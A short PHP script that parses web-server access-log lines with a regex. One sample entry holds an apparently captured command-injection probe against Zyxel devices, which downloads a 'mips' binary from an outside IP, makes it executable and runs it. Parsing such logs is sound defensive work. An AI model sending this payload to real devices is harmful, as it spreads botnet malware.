<?php

$logEntries = [
    "[25/Dec/2023:06:55:52 +0000] _{^&*}_ astramc.org _{^&*}_ - _{^&*}_ 1.1.1.1 _{^&*}_ GET / HTTP/1.1 _{^&*}_ 444 _{^&*}_ 0 _{^&*}_ Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 _{^&*}_ - _{^&*}_ 0.000 _{^&*}_ - _{^&*}_ 528 _{^&*}_ 1426 _{^&*}_ - ;;;",
    "[25/Dec/2023:07:34:00 +0000] _{^&*}_ _ _{^&*}_ - _{^&*}_ 1.1.1.1 _{^&*}_ GET /bin/zhttpd/http://103.110.33.164/mips;${IFS}chmod\${IFS}777\${IFS}mips;\${IFS}./mips\${IFS}zyxel.selfrep; _{^&*}_ 400 _{^&*}_ 248 _{^&*}_ - _{^&*}_ - _{^&*}_ 0.000 _{^&*}_ - _{^&*}_ 168 _{^&*}_ 534 _{^&*}_ text/html ;;;"
	// ... (other log entries)
];

// Full pattern to match all variables
$pattern = '/^\[([^\]]+)\] _\{[\^&\*]+\}_ (.*?) _\{[\^&\*]+\}_ (.*?) _\{[\^&\*]+\}_ (.*?) _\{[\^&\*]+\}_ (.*?) _\{[\^&\*]+\}_ (.*?) _\{[\^&\*]+\}_ (.*?) _\{[\^&\*]+\}_ (.*?) _\{[\^&\*]+\}_ (.*?) _\{[\^&\*]+\}_ (.*?) _\{[\^&\*]+\}_ (.*?) _\{[\^&\*]+\}_ (.*?) _\{[\^&\*]+\}_ (.*?) _\{[\^&\*]+\}_ (.*?) /';

foreach ($logEntries as $logLine) {
    $matches = [];
    if (preg_match($pattern, $logLine, $matches)) {
        echo "Match found: ";
        print_r($matches); // Print the parsed data
    } else {
        echo "No match found for line: $logLine\n";
    }
}

?>
